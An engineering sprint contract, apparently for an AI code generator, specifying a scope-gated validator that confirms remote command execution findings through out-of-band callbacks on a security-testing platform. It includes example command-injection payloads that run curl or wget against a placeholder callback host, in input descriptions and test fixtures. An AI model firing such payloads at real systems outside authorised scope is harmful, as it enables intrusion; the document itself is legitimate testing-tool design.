# Sprint 20 Contract v1 — RCE Validator (OOB-Augmented Shell Payload Confirmation)

**Generator:** generator-s20 (Sonnet 4.6)
**Phase:** 6 — Validation expansion (FINAL sprint)
**Base commit:** `737ba11` (S19 CLOSED)
**Baseline:** no-DB 1097/0/393, full-PG 1347/2/19, AUDIT_ACTIONS=69, ENVELOPE_KINDS=9, RBAC_MATRIX=1575, B6 K=9

---

## Deliverables summary

| ID | Deliverable |
|---|---|
| A | `services/validator-worker/src/rce-validator.ts` — NEW, OOB-callback-confirmed RCE |
| B | `services/validator-worker/src/worker.ts` — extend with `handleRceReplay` |
| C | `apps/api/src/scope-engine/start-decepticon-session.ts` — RCE envelope dispatch with OOB token |
| D | `services/validator-worker/src/payload-schema.ts` — additive `validateRceReplayPayloadSchema` |
| E | AUDIT_ACTIONS 69 → 73 (4 new `validator.rce.*` actions) |
| F | ENVELOPE_KINDS 9 → 10 (`validator.rce.replay`) |
| G | RBAC_MATRIX stays 1575 (no new resource — RCE reuses `finding`/`evidence`) |
| H | Tests: unit (`rce-validator.test.ts`) + IT (`rce-pipeline.test.ts`) |
| I | NO new migration. NO new table. B6 K stays 9. |
| J | `packages/decepticon-adapter/src/types.ts` — additive `'rce'` in `CANDIDATE_TYPES` tuple |

---

## Acceptance Criteria

### A-20-RceValidator — `rce-validator.ts` implementation

- New file `services/validator-worker/src/rce-validator.ts`.
- Exports `validateRceCandidate(input: RceValidatorInput, deps: RceValidatorDeps): Promise<RceValidationResult>`.
- **Input fields:** `candidateFindingId`, `tenantId`, `assessmentId`, `projectId?: string | null`, `affectedUrl` (the candidate URL with embedded OOB token already in it, e.g. `http://target/api?cmd=$(curl http://oob-host/<token>)` or `?cmd=;wget+http://oob-host/<token>`), `token` (the OOB token to poll for), `scope: EffectiveScope` (non-null — worker guards null-scope before calling validator), `traceId`.
- **Scope gate FIRST — before network egress (S13 lesson, P14).** `scope` is always non-null at this point (worker guards null-scope before calling validator). Calls `decide(scope, { kind: 'http_request', url: affectedUrl, method: 'GET' }, scopeDeps)`.
  - `decision.allowed === false` → emit `validator.rce.replay_denied` audit (`outcome: 'denied'`, `resourceType: 'candidate_finding'`, `resourceId: candidateFindingId`, `metadata: { reason: decision.reason, affectedUrl }`) → return `{ status: 'out_of_scope', reason: decision.reason }`. **Zero HTTP calls made.**
- **Replay (only if scope gate passes):** `httpClient.get(affectedUrl)` — the URL already carries the embedded OOB token via shell payload (set by coordinator). Any outgoing call triggers the shell cmd if target is vulnerable; the shell calls back to OOB receiver.
  - Fetch error → emit `validator.rce.fetch_failed` audit (`outcome: 'denied'`, `metadata: { affectedUrl, error }`) → return `{ status: 'fetch_failed', reason }`. Terminal — no retry (S19 MED-1 lesson).
- **Poll for OOB callback match.** After successful fetch, poll `oobCallbackLoader(token)` every 500ms until match or `oobVerifyTimeoutMs ?? 10_000` elapsed (mirror SSRF pattern exactly):
  - Match → emit `validator.rce.confirmed` audit (`outcome: 'success'`, `metadata: { token, affectedUrl }`) → return `{ status: 'confirmed' }`.
  - Timeout → emit `validator.rce.unmatched` audit (`outcome: 'success'`, `metadata: { token, affectedUrl, timeoutMs }`) → return `{ status: 'unmatched' }`.
- **Audit ownership (M1):**
  - `validator.rce.replay_denied` reason:`no_scope` → **worker** (before calling validator)
  - `validator.rce.replay_denied` reason:`<engine deny>` → **validator** (decide() returned denied)
  - `validator.rce.replay_denied` reason:`assessment_mismatch` → **worker** (cross-assessment check)
  - `validator.rce.confirmed` → **validator** (OOB match)
  - `validator.rce.unmatched` → **validator** (timeout, no OOB match)
  - `validator.rce.fetch_failed` → **validator** (httpClient.get throw)
- **Does NOT insert finding** — worker calls `findingsWriter` on `confirmed` result (M2).

### A-20-RceWorkerWiring — `handleRceReplay` in worker.ts

- `services/validator-worker/src/worker.ts` gains exported function `handleRceReplay(deps, envelope): Promise<HandlerOutcome>`.
- Mirrors `handleSsrfReplay` structure exactly (worker.ts:497-652):
  1. Parse payload with `validateRceReplayPayloadSchema.safeParse(envelope.payload)` — nack on invalid.
  2. **Required deps check (MED-2 S18 lesson):** if `!deps.rceHttpClient || !deps.oobCallbackLoader` → emit `validation.inconclusive` audit `{ outcome: 'failure', metadata: { reason: 'config_error', missing: ... } }`, nack with `ScopeDenyError('rce_config_error', ['rce_deps_not_configured'])`.
  3. Load candidate via `deps.candidateLoader({ tenantId, candidateFindingId })` — nack `ScopeDenyError('rce_candidate_not_found', ['rce_candidate_not_found'])` if null or `candidate.type !== 'rce'`.
  4. **Cross-assessment binding (HIGH-1 S18+S19 codex lesson):** if `candidate.assessmentId !== payload.assessmentId || candidate.tenantId !== payload.tenantId` → emit `validator.rce.replay_denied` audit `{ outcome: 'denied', metadata: { reason: 'assessment_mismatch' } }` → return `{ kind: 'ack' }`. This check is BEFORE `buildScope` (mirror worker.ts:553-571).
  5. Load assessment via `deps.assessmentLoader({ tenantId, assessmentId })` — nack `ScopeDenyError('rce_assessment_not_found', ['rce_assessment_not_found'])` if null.
  6. `const scope = await deps.buildScope(payload.assessmentId)` — if null: **worker emits** `validator.rce.replay_denied` audit (`outcome: 'denied'`, `metadata: { reason: 'no_scope' }`) → return `{ kind: 'ack' }` (terminal — no retry). **Validator is NOT called.** (M1 ownership)
  7. Call `validateRceCandidate({ ..., scope: scope as EffectiveScope, affectedUrl: payload.affectedUrl, token: payload.token }, { scopeDeps, auditEmitter, httpClient: deps.rceHttpClient, oobCallbackLoader: deps.oobCallbackLoader, ...(deps.oobVerifyTimeoutMs !== undefined && { oobVerifyTimeoutMs: deps.oobVerifyTimeoutMs }) })`.
     - Note: RCE uses `payload.affectedUrl` (token-embedded URL from envelope) — NOT `candidate.affectedUrl`. The coordinator embeds the OOB token when building the replay URL; that URL must be preserved exactly as published.
  8. On `result.status === 'confirmed'` → `findingsWriter({ ..., type: 'rce', severity: 'critical', confidence: 'high', affectedUrl: candidate.affectedUrl, reproduction: { token: payload.token, affectedUrl: payload.affectedUrl }, validatorLog: [], validatedAt: ..., validatedBy: { status: 'confirmed' } })`. Swallow unique-violation (idempotent). (M2)
  9. Return `{ kind: 'ack' }` for all non-nack paths (confirmed/unmatched/out_of_scope/fetch_failed).
- `ValidatorWorkerDeps` interface extended with:
  - `rceHttpClient?: { get(url: string): Promise<void>; readonly callCount: number }` (returns `Promise<void>` — same as SSRF; RCE does not read the response body)
- Existing `ssrfHttpClient`, `lfiHttpClient`, `oobCallbackLoader`, `oobVerifyTimeoutMs` deps unchanged.

### A-20-RceCoordinatorDispatch — RCE envelope dispatch in start-decepticon-session.ts

- `apps/api/src/scope-engine/start-decepticon-session.ts` extended: when `candidate.type === 'rce'`, publish a `validator.rce.replay` envelope.
- Token format: `<candidateFindingId>.<tenantId>.<random8hex>` (identical to SSRF token format, per token.ts).
- OOB token embedded in `affectedUrl` via `_cs_token=<token>` query param (mirror S18 HIGH-2 fix at lines 500-502):
  ```
  rceReplayUrl = candidate.affectedUrl.includes('?')
    ? `${candidate.affectedUrl}&_cs_token=${rceToken}`
    : `${candidate.affectedUrl}?_cs_token=${rceToken}`
  ```
  (Coordinator appends the token to whatever shell-payload URL the decepticon emitted — the decepticon's job is to form the shell cmd with the OOB host; coordinator injects the specific token via query param so the OOB receiver can correlate.)
- Payload inline object literal (mirror SSRF dispatch at lines 494-504):
  ```
  { tenantId, projectId, assessmentId, candidateFindingId, candidateType: 'rce', affectedUrl: rceReplayUrl, token: rceToken, traceId }
  ```
- `services/coordinator/src/payloads.ts` **NOT modified** (M2 frozen — same as SSRF/LFI).
- Reuses `deps.randomHex8?.()` seam that SSRF already uses (lines 479-481) — RCE calls it the same way.

### A-20-RcePayloadSchema — additive schema export

- `services/validator-worker/src/payload-schema.ts` gains additive export:
  ```typescript
  // Sprint 20 — RCE replay envelope payload schema (additive).
  // affectedUrl IS in payload (OOB-token-embedded URL from coordinator — mirror SSRF HIGH-2).
  export const validateRceReplayPayloadSchema = z.object({
    tenantId: z.string().uuid(),
    projectId: z.string().uuid().nullable(),
    assessmentId: z.string().uuid(),
    candidateFindingId: z.string().uuid(),
    candidateType: z.literal('rce'),
    affectedUrl: z.string().url(),
    token: z.string().min(1),
    traceId: z.string().regex(/^[0-9a-f]{32}$/),
  }).strict();
  export type ValidateRceReplayPayload = z.infer<typeof validateRceReplayPayloadSchema>;
  ```
- **`affectedUrl` IS in the RCE payload** (unlike LFI) — because the token-embedded replay URL differs from the raw `candidate.affectedUrl` stored in DB. Mirror SSRF schema (`validateSsrfReplayPayloadSchema` at lines 25-38 includes `replayUrl` + `token`).
- All existing exports unchanged.

### A-20-AuditActions — AUDIT_ACTIONS cardinality bump 69 → 73

- `packages/contracts/src/audit.ts` AUDIT_ACTIONS gains 4 new entries appended:
  - `'validator.rce.replay_denied'`
  - `'validator.rce.confirmed'`
  - `'validator.rce.unmatched'`
  - `'validator.rce.fetch_failed'`
- `packages/contracts/src/audit.test.ts`:
  - Comment updated to include `Sprint 20 RCE validator (4)`.
  - `expect(AUDIT_ACTIONS.length).toBe(73); // Sprint 20: 69 + 4 = 73`

### A-20-EnvelopeKind — ENVELOPE_KINDS cardinality bump 9 → 10

- `packages/contracts/src/queue-envelope.ts` ENVELOPE_KINDS gains `'validator.rce.replay'` with comment `// Sprint 20 — validator-worker subscribes to replay RCE candidates.`
- `packages/contracts/src/queue-envelope.test.ts` updated: `expect(ENVELOPE_KINDS.length).toBe(10);`
- `packages/queue/src/types.ts` and `packages/queue/src/index.test.ts` — parity bump to match (mirror S19 pattern).

### A-20-RbacMatrix — NO change (stays 1575)

- No new resource. RCE findings reuse existing `finding` resource.
- `packages/authz/src/matrix.test.ts`: `expect(RBAC_MATRIX.size).toBe(1575);` unchanged.
- No role files modified.
- **Pre-flight grep (H4 equivalent):** `grep -rn "'xss_reflected'\|'ssrf'\|'lfi'" packages/authz tests/integration/auth apps/api/src/routes` — expected empty result (no type-enumeration sites that need `'rce'` added). Generator must include grep result in implementation summary.

### A-20-NoMigration — no new migration, no new table

- No file added under `packages/db/migrations/`.
- B6 rollback loop K stays 9 (unchanged in `migrations.test.ts`).
- `tests/integration/db/schema-shape.test.ts` passes without changes.

### A-20-CandidateTypes — additive `'rce'` in CANDIDATE_TYPES

- `packages/decepticon-adapter/src/types.ts` line ~74 (`CANDIDATE_TYPES` tuple) gains `'rce'` (additive, single line, mirrors S19 `'lfi'` precedent).
- Without this, `if (candidate.type === 'rce')` in `start-decepticon-session.ts` would be dead code (TS2367).
- Zod schema auto-extends — no behavioral diff.

### A-20-UnitTests — unit tests for rce-validator.ts

- `services/validator-worker/src/rce-validator.test.ts` (NEW).
- **Required test paths (5 required):**
  1. **Scope deny path:** `decide` returns `allowed=false` → `status === 'out_of_scope'`, `validator.rce.replay_denied` audit emitted with `outcome:'denied'` and `reason` from engine, `httpClient.callCount === 0`.
  2. **Confirmed via OOB match:** scope passes, `httpClient.get` resolves, `oobCallbackLoader` returns `true` on first poll → `status === 'confirmed'`, `validator.rce.confirmed` audit emitted with `outcome:'success'`.
  3. **Unmatched (no OOB in window):** scope passes, fetch succeeds, `oobCallbackLoader` always returns `false` throughout timeout window → `status === 'unmatched'`, `validator.rce.unmatched` audit emitted with `outcome:'success'`.
  4. **Fetch error → fetch_failed + terminal ack:** `httpClient.get` throws → `status === 'fetch_failed'`, `validator.rce.fetch_failed` audit emitted with `outcome:'denied'`, return is terminal (S19 MED-1 regression).
  5. **Cross-assessment mismatch → replay_denied reason:assessment_mismatch:** worker-level test verifying that when `candidate.assessmentId !== payload.assessmentId` → `validator.rce.replay_denied` audit emitted with `reason:'assessment_mismatch'`, `httpClient.callCount === 0`, no finding inserted (S18/S19 HIGH-1 regression).
- **Coverage ≥80%** for `rce-validator.ts`.

### A-20-IT — integration test: RCE pipeline

- `tests/integration/validator/rce-pipeline.test.ts` (NEW).
- **P45 mandate: generator MUST run full-PG on this file before ready-for-review SendMessage.**
- `resetAuthState` called in `beforeEach` AND `afterAll` (P27: `grep -c resetAuthState rce-pipeline.test.ts ≥ 2`).
- **Happy path (OOB confirmed):** seed RCE candidate with `type='rce'`, `affectedUrl='http://target.local/?cmd=$(curl http://oob-host/<candidateId>.<tenantId>.abcd1234)'` → call `handleRceReplay` with token-embedded URL → mock `rceHttpClient.get` resolves → mock `oobCallbackLoader(token)` returns `true` → `status === 'confirmed'` → `findings` row inserted with `type='rce'`, `severity='critical'` → `validator.rce.confirmed` audit in `audit_events` with `outcome='success'` → **assert outbound URL contains OOB token** (S18 HIGH-2 regression).
- **Scope deny path:** assessment scope configured to deny the affectedUrl → `handleRceReplay` returns `{ kind: 'ack' }`, `validator.rce.replay_denied` audit emitted with `outcome='denied'`; `rceHttpClient.callCount === 0`; no `findings` row inserted.
- **Unmatched path:** scope passes, fetch succeeds, `oobCallbackLoader` always `false` within timeout → `validator.rce.unmatched` audit emitted with `outcome='success'`; no `findings` row.
- **Cross-assessment IT (S18 HIGH-1 regression):** two tenants A and B; seed RCE candidate under assessment A; send `validator.rce.replay` envelope claiming `assessmentId=B` → assert NO `httpClient` call + NO finding inserted + `validator.rce.replay_denied` audit with `reason='assessment_mismatch'` (mirrors lfi-pipeline.test.ts:608 pattern).
- **Fetch error IT (S19 MED regression):** `rceHttpClient.get` throws → `validator.rce.fetch_failed` audit emitted + `{ kind: 'ack' }` (terminal — no nack/retry).
- Mock `rceHttpClient.get(url): Promise<void>` and `oobCallbackLoader(token): Promise<boolean>` — no real HTTP.

### A-20-LintTC — lint and typecheck clean

- `bun run lint` → 0 errors.
- `bun run typecheck` → 0 errors.

### A-20-Tests — full suite within budget

- No-DB: ≥1097 pass / 0 fail (≥ baseline).
- Full-PG (`DATABASE_URL=postgres://cs:cs@localhost:5433/cyberstrike bun test`, no path filter per P40): ≤3 fail (≤3 flake budget; S11 baseline + B-18a carry permitted).

### A-20-P36Compliance — generator does NOT write evaluator-result.md

- Generator writes `sprint-20-implementation-summary.md` only.
- No file named `sprint-20-evaluator-result.md` created by generator at any handoff.

---

## Pure-fn values (code-verified per P37)

- `AUDIT_ACTIONS.length` after S20: **73** (69 base + 4 = 73)
- `ENVELOPE_KINDS.length` after S20: **10** (9 base + 1 = 10)
- `RBAC_MATRIX.size` after S20: **1575** (unchanged — no new resource)
- B6 rollback loop K: **9** (unchanged — no new migration)
- New audit actions: `validator.rce.replay_denied`, `validator.rce.confirmed`, `validator.rce.unmatched`, `validator.rce.fetch_failed`
- New envelope kind: `validator.rce.replay`
- New files: `services/validator-worker/src/rce-validator.ts`, `services/validator-worker/src/rce-validator.test.ts`, `tests/integration/validator/rce-pipeline.test.ts`
- Modified files (non-test): `services/validator-worker/src/worker.ts`, `services/validator-worker/src/payload-schema.ts`, `apps/api/src/scope-engine/start-decepticon-session.ts`, `packages/contracts/src/audit.ts`, `packages/contracts/src/queue-envelope.ts`, `packages/queue/src/types.ts`, `packages/queue/src/index.test.ts`, `packages/decepticon-adapter/src/types.ts`
- RCE reproduction jsonb shape: `{ token: string, affectedUrl: string }` (token-embedded URL)
- RCE finding severity: `'critical'` (elevated from `'high'` — command execution is critical severity)
- `rceHttpClient.get(url): Promise<void>` (same as SSRF — RCE does not inspect response body; confirmation is via OOB)

---

## Design rationale for RCE vs SSRF vs LFI

| Aspect | SSRF | LFI | RCE |
|---|---|---|---|
| Confirmation | OOB callback poll | Sentinel regex match | OOB callback poll |
| Reads response body? | No | Yes (sentinel) | No |
| OOB token in payload? | Yes (`replayUrl` + `token`) | No | Yes (`affectedUrl` + `token`) |
| `affectedUrl` in schema? | Yes (as `replayUrl`) | No (loaded from DB) | Yes (token-embedded URL) |
| httpClient return type | `Promise<void>` | `Promise<{ body: string }>` | `Promise<void>` |
| Finding severity | `high` | `high` | `critical` |

RCE is structurally SSRF with a shell-payload URL instead of a server-side redirect URL. The OOB polling mechanism is identical. The distinction is in what the target-side vulnerability is (command execution vs server request) and that the decepticon already formed the shell payload URL before handing off to coordinator.

---

## Backlog carries from S19 (non-gating)

- **B-19codex-a** — SSRF fetch_failed unit test (ssrf-validator.ts lines 102-106 uncovered). Add 1 SSRF unit test mirroring lfi-validator.test.ts:323-362.
- **B-19codex-b** — SSRF cross-assessment IT path clone into ssrf-pipeline.test.ts.
- **B-19a** — comment at `packages/audit/src/writer.ts:82` explaining `outcome+metadata` live in `after_state` jsonb (non-obvious read pattern).
- **B-18a** — projects.test.ts suite-mode isolation (carry).
- **B-18b** — oob-receiver socket-mock unit tests (carry).
- **B-18c** — factory.ts / roles.ts coverage (carry).
- **B-17a** — four-step rollback test for mig 020 (carry).

These carries are NOT gating for S20. S20 scope is strictly: rce-validator.ts + worker.ts extension + coordinator dispatch + payload schema + cardinality bumps + unit tests + IT.

---

## R# Risk notes (for evaluator)

| R | Risk | Mitigation |
|---|---|---|
| R1 | OOB token embedding in shell-payload URL may break URL structure | Coordinator appends via `_cs_token=` query param only — does not modify the shell payload portion; OOB receiver parses token from query param first (token.ts:extractTokenFromPath) |
| R2 | `affectedUrl` IN payload schema (differs from LFI) | Intentional: RCE token-embedded URL differs from `candidate.affectedUrl` in DB; worker uses `payload.affectedUrl` for the fetch, `candidate.affectedUrl` for the finding record |
| R3 | S18 HIGH-2 lesson: assert outbound URL contains token | IT happy-path asserts `rceHttpClient` call arg contains OOB token (S18 HIGH-2 regression) |
| R4 | S18/S19 HIGH-1 lesson: cross-assessment binding BEFORE buildScope | Worker cross-asmt check at step 4 precedes `buildScope` at step 6 (same ordering as SSRF :553 and LFI :756) |
| R5 | P27 — resetAuthState ≥2 per IT file | rce-pipeline.test.ts calls resetAuthState in beforeEach + afterAll |
| R6 | P45 — new IT must be PG-validated by generator before SendMessage | Generator will run `DATABASE_URL=postgres://cs:cs@localhost:5433/cyberstrike bun test tests/integration/validator/rce-pipeline.test.ts` before signaling ready |
| R7 | M2 frozen surface | coordinator/payloads.ts NOT modified; all schema changes in payload-schema.ts only |
| R8 | decepticon-adapter CANDIDATE_TYPES additive | Single-line `+'rce'` in types.ts; authorized M2 exception per S19 `+'lfi'` precedent |

---

## Audit ownership split (M1 — explicit)

| Event | Owner | Trigger |
|---|---|---|
| `validator.rce.replay_denied` reason:`no_scope` | **worker** (`handleRceReplay` step 6) | `buildScope()` returns null — validator not called |
| `validator.rce.replay_denied` reason:`assessment_mismatch` | **worker** (`handleRceReplay` step 4) | Cross-assessment check fails — before buildScope |
| `validator.rce.replay_denied` reason:`<engine reason>` | **validator** (`validateRceCandidate`) | `decide()` returns `allowed=false` — httpClient not called |
| `validator.rce.confirmed` | **validator** | OOB callback match within timeout |
| `validator.rce.unmatched` | **validator** | Timeout — no OOB callback match |
| `validator.rce.fetch_failed` | **validator** | `httpClient.get()` throws |

---

## Verification matrix (evaluator will check)

| Gate | Method |
|---|---|
| A-20-RceValidator | Read rce-validator.ts; scope is EffectiveScope (non-null); scope-gate-first; callCount=0 on deny; OOB poll loop mirrors SSRF exactly; fetch error try/catch terminal; no findingsWriter call |
| A-20-RceWorkerWiring | worker.ts handleRceReplay exported; rceHttpClient dep; cross-asmt check BEFORE buildScope; null-scope→worker-audit+ack; confirmed→findingsWriter severity=critical; payload.affectedUrl used for fetch (not candidate.affectedUrl) |
| A-20-RceCoordinatorDispatch | start-decepticon-session.ts RCE block; token embedding `_cs_token=`; git diff coordinator/payloads.ts = empty |
| A-20-RcePayloadSchema | payload-schema.ts additive; affectedUrl + token present; existing exports unchanged |
| A-20-AuditActions | AUDIT_ACTIONS.length === 73 in no-DB run |
| A-20-EnvelopeKind | ENVELOPE_KINDS.length === 10 |
| A-20-RbacMatrix | RBAC_MATRIX.size === 1575 unchanged; impl-summary cites H4 grep result = empty |
| A-20-NoMigration | No new migration file; B6 K=9 unchanged |
| A-20-CandidateTypes | decepticon-adapter/types.ts `+'rce'` single-line additive; schema-shape tests pass |
| A-20-UnitTests | 5 required paths; coverage ≥80% rce-validator.ts; callCount=0 on deny; token-in-URL assertion on happy path |
| A-20-IT | 5 IT paths; P27 ≥2 resetAuthState; outbound-URL-contains-token assertion (HIGH-2 regression); cross-asmt assertion (HIGH-1 regression); fetch_failed terminal ack (MED regression) |
| A-20-LintTC | 0/0 |
| A-20-Tests | ≥1097/0 no-DB; ≤3 PG fail (P35+P40) |
| A-20-P36Compliance | No sprint-20-evaluator-result.md written by generator |
